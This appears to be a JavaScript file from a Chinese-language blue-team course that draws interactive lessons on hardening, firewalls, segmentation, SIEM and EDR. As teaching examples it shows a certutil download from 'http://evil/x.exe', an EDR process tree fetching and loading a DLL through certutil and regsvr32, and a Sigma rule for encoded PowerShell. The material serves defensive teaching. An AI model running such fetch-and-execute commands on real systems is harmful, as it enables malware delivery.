/* ================================================================
   SEC·ATLAS · viz-l3.js
   L3 防御基础（蓝队）阶段的可视化：§27–§36
   依赖: utils.js、$/$$、viz-kit.js（bindSeg/barRow/kpi/panel）、theme.js（PAL）
   ================================================================ */
"use strict";

/* ================= §27 防御是一条链 ================= */
class DefenseLoopViz{
  constructor(){
    this.body = $("#loopBody");
    this.cur = "prevent";
    this.data = {
      prevent:{ ti:"① 预防 · 加固", de:"在攻击者进来之前把门焊死：基线、补丁、白名单、最小权限。",
        rows:[["挡什么","绝大多数低级、自动化入侵","good"],["失效信号","基线扫描出现偏差项","amb"],["怎么验证","每月回读验证 + 紫队演练","good"],["修复成本","×1（最便宜）","grn"]] },
      detect:{ ti:"② 检测 · 看见", de:"假设已被突破，靠日志、EDR、SIEM 在最早时间发现异常。",
        rows:[["挡什么","已发生的入侵被及时发现","good"],["失效信号","告警淹没 / 无日志覆盖","amb"],["怎么验证","紫队投放行为，看能否告警","good"],["修复成本","×5","amb"]] },
      respond:{ ti:"③ 响应 · 止血", de:"阻断、隔离、封禁账号、下线接口，把伤害圈在最小范围。",
        rows:[["挡什么","阻止横向扩散与持续","good"],["失效信号","剧本未演练、MTTR 过长","amb"],["怎么验证","定期走 SOAR 剧本演练","good"],["修复成本","×20","red"]] },
      improve:{ ti:"④ 复盘 · 不再重蹈", de:"把这次事件变成下一次的防线：补漏洞、改流程、更新规则。",
        rows:[["挡什么","同类事件再次复现","good"],["失效信号","复盘结论无工单闭环","amb"],["怎么验证","复测 + 度量闭环率","good"],["修复成本","×50（最贵）","red"]] },
    };
    this.render();
    this.body.onclick = e => {
      const n = e.target.closest("[data-id]");
      if(n){ this.cur = n.dataset.id; this.render(); }
    };
  }
  render(){
    const order = ["prevent","detect","respond","improve"];
    const chain = order.map((k,i) =>
      `<div class="knode ${this.cur===k?"on":""}" data-id="${k}">
        <div class="n-ix">STEP ${i+1}</div><div class="n-ti">${this.data[k].ti.split(" · ")[1]}</div>
        <div class="n-su">${this.data[k].ti.split(" · ")[0].replace(/^[①②③④]\s*/, "")}</div></div>`).join("");
    const d = this.data[this.cur];
    this.body.innerHTML = `<div class="kit">
      <div class="kchain">${chain}</div>
      ${panel(d.ti, d.de, d.rows)}
      <div class="kkpi">
        ${kpi("×1","预防成本","grn")}${kpi("×5","检测成本","amb")}
        ${kpi("×20","响应成本","red")}${kpi("×50","复盘成本","red")}
      </div>
      <div class="ksub">越靠后的环节成本越高、伤害越大。<strong>把预算和精力放在链子的前端（预防+检测），比事后救火划算得多。</strong></div>
    </div>`;
  }
}

/* ================= §28 安全基线与账户加固 ================= */
class BaselineLabViz{
  constructor(){
    this.body = $("#baseBody");
    this.items = [
      ["禁用无用账号","L1","后门账号 / 默认账号被利用","后门账号保留"],
      ["UID=0 后门检查","L1","提权后门被隐藏","隐藏提权账户"],
      ["空口令检测","L1","无密码直接登录","免密登录通道"],
      ["口令复杂度策略","L1","弱口令爆破","弱口令爆破"],
      ["登录失败锁定","L1","爆破被无限尝试","无限制爆破"],
      ["禁止 root 直登 SSH","L1","root 被远程爆破","root 远程爆破"],
      ["服务最小化","L1","多余服务暴露漏洞","多余攻击面"],
      ["关闭 SMBv1","L2","永恒之蓝类漏洞","EternalBlue 通道"],
      ["补丁保持最新","L1","已知 CVE 被利用","已知漏洞利用"],
      ["LAPS 口令轮换","L2","一点突破全网复用","凭据横向复用"],
      ["Credential Guard","L2","Mimikatz 抓凭据","LSASS 凭据泄露"],
      ["应用白名单","L2","未知恶意软件落地","任意程序执行"],
    ];
    this.state = this.items.map(()=>false);
    this.render();
    bindSeg(this.body, null, m => this.preset(m));
    this.body.onclick = e => {
      const ci = e.target.closest(".ci");
      if(ci){ const i = +ci.dataset.i; this.state[i] = !this.state[i]; this.render(); }
    };
  }
  preset(m){
    this.state = this.items.map(it => m==="fresh" ? false : m==="cis2" ? true : it[1]==="L1");
    this.render();
  }
  render(){
    const done = this.state.filter(Boolean).length;
    const total = this.items.length;
    const score = Math.round(done/total*100);
    const residual = this.items.filter((it,i)=>!this.state[i]).map(it=>it[3]);
    const list = this.items.map((it,i) =>
      `<div class="ci ${it[1]==="L2"?"l2":""} ${this.state[i]?"":"un"}" data-i="${i}">
        <div class="box ${this.state[i]?"on":""}">${this.state[i]?"✓":""}</div>
        <div class="ct">${it[0]}<small>${it[1]==="L1"?"CIS L1 · ":"CIS L2 · "}${it[2]}</small></div>
        <div class="lv">${it[1]}</div></div>`).join("");
    const resid = residual.length
      ? `<div class="ksub">残余可走的路（${residual.length}）：` + residual.map(r=>`<span class="kbadge red">${r}</span>`).join("") + `</div>`
      : `<div class="ksub"><span class="kbadge grn">全部加固项已启用，残余路径清零</span></div>`;
    this.body.innerHTML = `<div class="kit"><div class="k-grid2">
      <div class="kchk">${list}</div>
      <div>
        <div class="kkpi">
          ${kpi(score+"%","安全基线评分", score>=80?"grn":score>=50?"amb":"red")}
          ${kpi(residual.length,"残余攻击路径", residual.length?"red":"grn")}
        </div>
        <div style="margin-top:14px">${barRow("已启用加固项", done, total, false)}</div>
        ${resid}
      </div></div></div>`;
  }
}

/* ================= §29 攻击面收敛 ================= */
class PortMapViz{
  constructor(){
    this.body = $("#portBody");
    this.srv = [
      ["Web 服务","nginx","80 / 443",0],
      ["SSH","OpenSSH","22",1],
      ["数据库","MySQL","3306",2],
      ["缓存","Redis","6379",2],
      ["文件共享","SMB","445",2],
      ["远程桌面","RDP","3389",1],
      ["Docker API","dockerd","2375",2],
      ["CI 面板","Jenkins","8080",2],
    ];
    // 0=公网 1=内网 2=关闭
    this.names = ["公网","内网","关闭"];
    this.cls = ["pub","int","off"];
    this.render();
    this.body.onclick = e => {
      const sv = e.target.closest(".st");
      if(sv){ const i = +sv.dataset.i; this.srv[i][3] = (this.srv[i][3]+1)%3; this.render(); }
    };
  }
  render(){
    const pub = this.srv.filter(s=>s[3]===0).length;
    const warn = this.srv.find(s=>s[0]==="缓存" && s[3]===0);
    const rows = this.srv.map(s =>
      `<div class="sv"><span class="nm">${s[0]}<small>${s[1]} · ${s[2]}</small></span>
        <span class="pt">${s[2]}</span>
        <span class="st ${this.cls[s[3]]}" data-i="${this.srv.indexOf(s)}">${this.names[s[3]]}</span></div>`).join("");
    const warnBox = warn
      ? `<div class="ksub"><span class="kbadge red">Redis 暴露公网 + 默认无密码 → 经典挖矿/勒索入口</span>
         把它切到「关闭」或「内网」即可消除这一高危面。把 bind 改成 127.0.0.1 等于从公网消失。</div>`
      : `<div class="ksub"><span class="kbadge grn">缓存未暴露公网</span></div>`;
    this.body.innerHTML = `<div class="kit">
      <div class="kkpi">${kpi(pub,"公网暴露端口",pub?"red":"grn")}${kpi(this.srv.length-pub,"收敛端口","cyn")}</div>
      <div style="margin:14px 0 6px">${barRow("公网攻击面", pub, this.srv.length, pub>2)}</div>
      <div class="kserv">${rows}</div>
      ${warnBox}
      <div class="ksub">点击每一行的状态标签循环：<b>公网 → 内网 → 关闭</b>。攻击面收敛的本质，就是让「默认关闭、按需最小开放」成为习惯。</div>
    </div>`;
  }
}

/* ================= §30 完整性与强制访问控制 ================= */
class IntegrityLabViz{
  constructor(){
    this.body = $("#integBody");
    this.mode = "enforcing"; // enforcing / permissive / disabled
    this.render();
    bindSeg(this.body, "enforcing", m => { this.mode = m; this.render(); });
  }
  render(){
    const modeLabel = {enforcing:"Enforcing 拒绝并记录",permissive:"Permissive 只记录不拒绝",disabled:"Disabled 完全关闭"};
    const modeCls = {enforcing:"grn",permissive:"amb",disabled:"red"};
    const fim = [
      ["/etc/passwd","a1b2c3…","正常"],
      ["/var/www/index.php","d4e5f6…","正常"],
      ["/bin/login","ff00aa…","异常·已篡改"],
    ];
    const fimRows = fim.map(f =>
      `<div class="kv" style="display:grid;grid-template-columns:1fr 90px auto;gap:8px;align-items:center;
        padding:8px 11px;border:1px solid var(--line2);border-radius:9px;background:var(--bg2);font-family:var(--f-mono);font-size:12px;color:var(--tx)">
        <span>${f[0]}</span><span style="color:var(--cyn)">${f[1]}</span>
        <span class="kbadge ${f[2].startsWith("异常")?"red":"grn"}">${f[2]}</span></div>`).join("");
    // MAC 测试结果：Web 进程(被控)试图读 /etc/shadow
    const macResult = {
      enforcing:["被 SELinux 策略拦截","root 进程也受域约束，读不了 /etc/shadow"],
      permissive:["仅记录一条 AVC，放行","「开着但不拦」= 没开"],
      disabled:["直接读取成功","无 MAC 防护，root 为所欲为"],
    }[this.mode];
    const macCls = {enforcing:"pass",permissive:"unkn",disabled:"drop"}[this.mode];
    this.body.innerHTML = `<div class="kit"><div class="k-grid2">
      <div>
        <div class="k-h"><b>① 文件完整性监控（FIM）</b>· SHA-256 基线比对</div>
        <div style="display:grid;gap:8px">${fimRows}</div>
        <div class="ksub">基线采集后，任何对关键文件的改写都会让哈希失配 → 立即告警。这是「篡改被发现」的第一道防线。</div>
      </div>
      <div>
        <div class="k-h"><b>② 强制访问控制（MAC / SELinux）</b></div>
        <div style="margin-bottom:10px"><span class="kpill"><span class="pp ${this.mode==="enforcing"?"on":""}">Enforcing</span><span class="pp ${this.mode==="permissive"?"on amb":""}">Permissive</span><span class="pp ${this.mode==="disabled"?"on red":""}">Disabled</span></span></div>
        <div class="kmini"><span class="cm"># 被控的 Web 进程尝试读敏感文件</span>
<span class="fn">httpd_t</span> → read <span class="st">/etc/shadow</span>
<span class="kw">result</span>: <span class="hl">${macResult[0]}</span></div>
        <div class="ktwin" style="grid-template-columns:1fr;margin-top:10px">
          <div class="twin sig"><div class="tw-h"><span>${modeLabel[this.mode]}</span></div>
            <div class="verdict ${macCls}">${macCls==="pass"?"✓ 拦截":macCls==="unkn"?"⚠ 放行·仅留日志":"✗ 读取成功"}</div>
            <div class="ksub" style="margin-top:10px">${macResult[1]}</div></div>
        </div>
      </div>
    </div>
    <div style="margin-top:16px"><div class="k-h"><b>③ 应用白名单</b>· 即便绕过前两层，未知程序也跑不起来</div>
      <div class="kmini"><span class="cm"># 攻击者用白名单内的程序执行恶意操作（LOLBins）</span>
<span class="kw">certutil</span> -urlcache -split -f http://evil/x.exe  <span class="bd">← 光看程序名拦不住，要看参数</span></div>
      <div class="ksub">白名单必须配合 <b>命令行参数级检测</b>：运行了 certutil 不可怕，可怕的是它带了 <span class="kbadge amb">-urlcache -f http://</span>。</div>
    </div></div>`;
  }
}

/* ================= §31 防火墙与网络分段 ================= */
class FirewallBenchViz{
  constructor(){
    this.body = $("#fwBody");
    this.rules = [
      ["策略默认","INPUT DROP","—","丢弃（兜底）"],
      ["已建立连接","ESTABLISHED,RELATED","ACCEPT","放行回包"],
      ["回环","lo","ACCEPT","本机通信"],
      ["SSH 内网","10.0.0.0/8 → :22","ACCEPT","仅内网可连"],
      ["Web","→ :80","ACCEPT","对外 Web"],
      ["Web TLS","→ :443","ACCEPT","对外 Web"],
      ["SSH 限速","NEW → :22 超 4/分","DROP","防爆破"],
    ];
    this.pkts = [
      {n:"Web 访问 :443",t:"1.2.3.4:54321 → :443",m:5,d:"命中规则⑥，公网正常对外"},
      {n:"内网 SSH",t:"10.1.2.3:5000 → :22",m:3,d:"命中规则④，内网放行"},
      {n:"公网首次 SSH",t:"1.2.3.4:54321 → :22",m:6,d:"命中规则⑦，未超频放行（首包）"},
      {n:"公网盲扫 :9999",t:"1.2.3.4:54321 → :9999",m:0,d:"无规则命中 → 默认 DROP（兜底）"},
      {n:"已建立回包",t:"10.1.2.3 ← :22",m:1,d:"命中规则②，回包放行"},
    ];
    this.cur = 0;
    this.render();
    this.body.onclick = e => {
      const p = e.target.closest("[data-p]");
      if(p){ this.cur = +p.dataset.p; this.render(); }
    };
  }
  render(){
    const pk = this.pkts[this.cur];
    const ruleRows = this.rules.map((r,i) =>
      `<div class="kv" style="display:grid;grid-template-columns:auto 1fr auto;gap:10px;align-items:center;
        padding:7px 11px;border:1px solid var(--line2);border-radius:8px;background:var(--bg2);
        font-family:var(--f-mono);font-size:12px;color:var(--tx)${i===pk.m?";border-color:var(--grn);background:rgba(49,255,176,.08)":""}">
        <span style="color:var(--tx3)">#${i+1}</span>
        <span><span style="color:var(--cyn)">${r[1]}</span> <span style="color:var(--tx3)">${r[2]}</span></span>
        <span class="kbadge ${r[3].includes("DROP")?"red":r[3].includes("ACCEPT")?"grn":"amb"}">${r[3]}</span></div>`).join("");
    const pktBtns = this.pkts.map((p,i) =>
      `<span class="kbadge ${i===this.cur?"grn":""}" style="cursor:pointer" data-p="${i}">${p.n}</span>`).join("");
    this.body.innerHTML = `<div class="kit"><div class="k-grid2">
      <div>
        <div class="k-h"><b>规则链（自上而下，第一条命中即生效）</b></div>
        <div style="display:grid;gap:7px">${ruleRows}</div>
      </div>
      <div>
        <div class="k-h"><b>测试报文</b></div>
        <div style="display:flex;flex-wrap:wrap;gap:6px;margin-bottom:12px">${pktBtns}</div>
        <div class="kmini"><span class="kw">packet</span>: ${pk.t}</div>
        <div class="ktwin" style="grid-template-columns:1fr;margin-top:10px">
          <div class="twin sig"><div class="tw-h"><span>判决</span></div>
            <div class="verdict pass">命中规则 #${pk.m+1} → 放行</div>
            <div class="ksub" style="margin-top:10px">${pk.d}</div></div>
        </div>
      </div></div>
      <div class="ksub">关键点：<span class="kbadge amb">ESTABLISHED,RELATED</span> 必须排在具体 ACCEPT 之后、默认 DROP 之前；<span class="kbadge red">conntrack 表满</span> 会让新连接被丢弃——高并发下的经典故障。</div>
    </div>`;
  }
}

/* ================= §32 IDS / IPS 与 WAF ================= */
class DetectEngineViz{
  constructor(){
    this.body = $("#detBody");
    this.cases = [
      {n:"已知 SQL 注入特征","sig":"命中 /UNION SELECT/","sigV":"pass",an:"正常流量，无异常","anV":"pass",fp:"低"},
      {n:"混淆变形注入","sig":"无已知特征串","sigV":"unkn",an:"参数偏离基线行为","anV":"drop",fp:"中"},
      {n:"正常但罕见请求","sig":"无特征","sigV":"unkn",an:"偏离日常基线","anV":"drop",fp:"高(误报)"},
    ];
    this.cur = 0;
    this.render();
    this.body.onclick = e => {
      const c = e.target.closest("[data-c]");
      if(c){ this.cur = +c.dataset.c; this.render(); }
    };
  }
  render(){
    const k = this.cases[this.cur];
    const btns = this.cases.map((c,i)=>`<span class="kbadge ${i===this.cur?"grn":""}" style="cursor:pointer" data-c="${i}">${c.n}</span>`).join("");
    const vTxt = {pass:["✓ 命中·拦截","pass"],unkn:["？ 无匹配·放行","unkn"],drop:["⚠ 异常·告警","drop"]};
    const a = vTxt[k.sigV], b = vTxt[k.anV];
    this.body.innerHTML = `<div class="kit">
      <div class="k-h"><b>同一份流量，两种引擎两种判决</b></div>
      <div style="display:flex;flex-wrap:wrap;gap:6px;margin-bottom:14px">${btns}</div>
      <div class="ktwin">
        <div class="twin sig"><div class="tw-h"><span>特征匹配（签名）</span><span>已知</span></div>
          <div class="kmini" style="margin-top:6px">${k.sig}</div>
          <div class="verdict ${a[1]}">${a[0]}</div>
          <div class="ksub" style="margin-top:10px">准确、快，但<b>只能发现已知的攻击</b>。</div></div>
        <div class="twin anom"><div class="tw-h"><span>异常检测（行为）</span><span>未知</span></div>
          <div class="kmini" style="margin-top:6px">${k.an}</div>
          <div class="verdict ${b[1]}">${b[0]}</div>
          <div class="ksub" style="margin-top:10px">能发现变种，但<b>误报率偏高（${k.fp}）</b>。</div></div>
      </div>
      <div class="ksub">WAF / IDS 永远会被绕过（编码、语法等价、请求走私、逻辑漏洞它看不见）。正确定位是<b>减速带</b>：提高攻击成本、挡住自动化扫描器，真正的安全靠代码本身。</div>
    </div>`;
  }
}

/* ================= §33 远程接入与微隔离 ================= */
class SegmentationViz{
  constructor(){
    this.body = $("#segBody");
    this.mode = "flat"; // flat / vlan / micro
    this.compromised = false;
    this.render();
    bindSeg(this.body, "flat", m => { this.mode = m; this.render(); });
    this.body.onclick = e => {
      const h = e.target.closest("[data-h]");
      if(h){ this.compromised = true; this.render(); }
    };
  }
  render(){
    const labels = {flat:"扁平网络",vlan:"VLAN 分段",micro:"微隔离"};
    // 主机列表；reach 表示在该模式下被攻陷后可到达的范围
    const hosts = [
      ["Web-01",0],["Web-02",1],["App-01",2],["DB-01",3],["File-01",4],["DC-01",5],
    ];
    const names = ["Web-01","Web-02","App-01","DB-01","File-01","域控 DC-01"];
    const reach = {
      flat:[0,1,2,3,4,5],
      vlan:[0,1],          // 同 DMZ
      micro:[0],           // 仅自身
    }[this.mode];
    const cells = hosts.map((hh,i) => {
      const hit = this.compromised && reach.includes(i);
      const isSrc = this.compromised && i===0;
      const cls = isSrc ? "hot" : hit ? "done" : "";
      const tag = isSrc ? "已被攻陷" : hit ? "可达·受威胁" : "隔离·安全";
      return `<div class="mn ${cls}" data-h="${i}">${names[i]}<span class="mn-su">${tag}</span></div>`;
    }).join("");
    const radius = {flat:"整个内网（6/6）",vlan:"仅 DMZ（2/6）",micro:"仅 Web 主机（1/6）"}[this.mode];
    this.body.innerHTML = `<div class="kit">
      <div class="kkpi">
        ${kpi(labels[this.mode],"网络模型","cyn")}
        ${kpi(this.compromised?radius.split("（")[1].replace("）",""):"—","爆炸半径","red")}
      </div>
      <div class="k-h" style="margin-top:16px"><b>点击任意主机模拟「该主机被攻陷」，看攻击者能横向到达哪里</b></div>
      <div class="kserv" style="grid-template-columns:repeat(3,1fr);margin-top:10px">${cells}</div>
      <div class="ksub">${
        this.compromised
        ? `<span class="kbadge red">${radius}</span> —— ${this.mode==="flat"?"扁平网络下一点突破全网沦陷":this.mode==="vlan"?"VLAN 限制了跨区，但区内仍自由":"微隔离下默认不通，攻击者撞墙"}。`
        : `未模拟。微隔离让「谁访问谁」默认禁止、需显式声明，直接对抗横向移动——代价是必须先梳理访问关系。`
      }</div>
    </div>`;
  }
}

/* ================= §34 日志、SIEM 与检测规则 ================= */
class SigmaBenchViz{
  constructor(){
    this.body = $("#sigmaBody");
    this.conds = ["logsource = process_creation","Image endswith powershell.exe","CommandLine contains -enc","父进程不是 explorer.exe"];
    this.n = 1;
    this.render();
    this.body.onclick = e => {
      const b = e.target.closest("[data-add]");
      if(b){ this.n = Math.min(4, this.n+1); this.render(); }
      const r = e.target.closest("[data-reset]");
      if(r){ this.n = 1; this.render(); }
    };
  }
  render(){
    const sel = this.conds.slice(0, this.n).map((c,i)=>`  selection_${i+1}: ${c}`).join("\n");
    // 在 1000 条样本上的表现：条件越多，FP 越少，但漏报风险越高
    const fp = [42,18,5,1][this.n-1];
    const miss = [3,5,9,16][this.n-1];
    const rule = `<span class="kw">title</span>: 可疑 PowerShell 编码执行
<span class="kw">logsource</span>: {category: process_creation}
<span class="kw">detection</span>:
${sel}
  <span class="kw">condition</span>: ${Array.from({length:this.n},(_,i)=>"selection_"+(i+1)).join(" and ")}
<span class="kw">level</span>: high`;
    this.body.innerHTML = `<div class="kit"><div class="k-grid2">
      <div>
        <div class="k-h"><b>Sigma 规则（厂商中立 YAML）</b></div>
        <div class="kmini">${rule}</div>
        <div style="margin-top:10px;display:flex;gap:8px">
          <span class="kbadge grn" style="cursor:pointer" data-add="${this.n}">＋ 增加条件（更精确）</span>
          <span class="kbadge amb" style="cursor:pointer" data-reset="1">↺ 重置</span>
        </div>
      </div>
      <div>
        <div class="k-h"><b>在 1000 条样本上的表现</b></div>
        <div class="kkpi">${kpi(fp,"误报数",fp>20?"red":fp>5?"amb":"grn")}${kpi(miss,"漏报数",miss>10?"red":miss>5?"amb":"grn")}</div>
        <div style="margin-top:14px">${barRow("条件数量", this.n, 4, false)}</div>
        <div class="ksub"><span class="kbadge vio">写一次，转成 Splunk/Elastic/Sentinel/QRadar 查询到处运行</span></div>
        <div class="ksub">条件越多越准、误报越少，但<b>也越容易漏</b>。好规则要持续观测误报率并迭代，而不是一次性写完。</div>
      </div></div></div>`;
  }
}

/* ================= §35 漏洞管理与优先级 ================= */
class PriorityMatrixViz{
  constructor(){
    this.body = $("#priBody");
    this.mode = "cvss"; // cvss / matrix
    this.sel = null;
    this.render();
    bindSeg(this.body, "cvss", m => { this.mode = m; this.render(); });
    this.body.onclick = e => {
      const c = e.target.closest("[data-cell]");
      if(c){ this.sel = c.dataset.cell; this.render(); }
    };
  }
  render(){
    if(this.mode==="cvss"){
      this.body.innerHTML = `<div class="kit">
        <div class="kkpi">
          ${kpi("300","CVSS≥7 漏洞数","red")}${kpi("8","业务真正要修","grn")}${kpi("躺平","业务方反应","red")}
        </div>
        <div class="k-h" style="margin-top:16px"><b>只按 CVSS 排序：300 个高危 → 业务方看一眼就放弃</b></div>
        <div class="ksub">漏洞管理的本质是<b>帮业务做减法</b>，不是把问题全部抛给业务。按 CVSS 排序会把真正要紧的 8 个淹没在 300 个里。</div>
      </div>`;
      return;
    }
    const grid = [
      ["","可利用性高","可利用性中","可利用性低"],
      ["重要度高","P0 · 24–72h","P1 · 7天","P2 · 30天"],
      ["重要度低","P1 · 7天","P2 · 30天","P3 · 下周期"],
    ];
    const cls = {P0:"p0",P1:"p1",P2:"p2",P3:"p3"};
    let html = `<div class="kmx" style="grid-template-columns:120px repeat(3,1fr)">`;
    grid.forEach((row,r)=>row.forEach((cell,c)=>{
      if(r===0){ html += `<div class="mx-c ${c===0?"corner":"rh"}">${cell}</div>`; }
      else if(c===0){ html += `<div class="mx-c rh">${cell}</div>`; }
      else { const p = cell.split(" ")[0]; const cellId = r+"-"+c;
        html += `<div class="mx-c ${cls[p]}${this.sel===cellId?"":""}" data-cell="${cellId}"${this.sel===cellId?' style="outline:2px solid var(--cyn);outline-offset:-2px"':""}>${cell}</div>`; }
    }));
    html += `</div>`;
    const note = this.sel
      ? `<div class="ksub"><span class="kbadge grn">选中单元格</span> 同样一个 CVSS 9.8 的洞：在核心对外系统上是 <b>P0</b>，在测试环境里是 <b>P3</b>。资产重要度 × 可利用性，才是工程上合理的优先级。</div>`
      : `<div class="ksub">点击单元格查看。<b>资产重要度 × 可利用性</b> 把 300 个高危收敛成 8 个 P0，业务方才修得动。</div>`;
    this.body.innerHTML = `<div class="kit"><div class="k-h"><b>资产 × 可利用性 优先级矩阵</b></div>${html}${note}</div>`;
  }
}

/* ================= §36 终端安全：EDR 与白名单 ================= */
class EdrRetroViz{
  constructor(){
    this.body = $("#edrBody");
    this.open = false;
    this.render();
    this.body.onclick = e => {
      const a = e.target.closest("[data-toggle]");
      if(a){ this.open = !this.open; this.render(); }
    };
  }
  render(){
    const ctx = this.open ? `
      <div class="kmini" style="margin-top:12px">
<span class="cm"># EDR 拉出的进程上下文（一次告警的溯源）</span>
<span class="fn">winword.exe</span>  (父: explorer) ─┐
<span class="fn">powershell.exe</span> -enc ★← 告警点 ─┤  <span class="bd">父进程是 Word，正常吗？</span>
<span class="fn">certutil.exe</span> -f http://1.2.3.4/x.dll ─┤  <span class="hl">落地文件</span>
<span class="fn">regsvr32.exe</span> x.dll ─────────────┘  <span class="hl">加载执行</span>
<span class="cm"># 网络 / 文件 / 注册表</span>
connect → 1.2.3.4:443   write → %temp%\\x.dll   reg → RunOnce</div>
      <div class="ksub">传统 AV 只能告诉你「现在有个病毒」；EDR 能回答：<b>谁启动的、落地了什么、连了谁、改了什么、最早何时出现</b>——这才是应急真正需要的。</div>`
      : `<div class="ksub">点开看告警背后 EDR 能补出多少上下文（进程树、文件、网络、注册表）。<span class="kbadge grn" style="cursor:pointer" data-toggle="1">展开进程上下文 ▾</span></div>`;
    this.body.innerHTML = `<div class="kit">
      <div class="kkpi">
        ${kpi("进程树","AV 看不到","red")}${kpi("上下文","EDR 能看到","grn")}${kpi("4","EDR 局限点","amb")}
      </div>
      <div class="k-h" style="margin-top:16px"><b>一条 powershell -enc 告警</b></div>
      <div class="kmini"><span class="fn">powershell.exe</span> -<span class="st">enc</span> JABlAG4AdABlA...</div>
      ${ctx}
      <div class="ksub">EDR 四局限：① 需正确配置策略 ② 需有人看（买了不用=没买）③ 内核级恶意软件可绕过 ④ 可能被卸载/致盲 → 所以要有<b>心跳检测</b>。白名单对抗未知恶意软件最有效，但攻击者用 <span class="kbadge amb">LOLBins</span>（certutil / mshta / rundll32）借白名单内程序行动，须做参数级检测。</div>
    </div>`;
  }
}
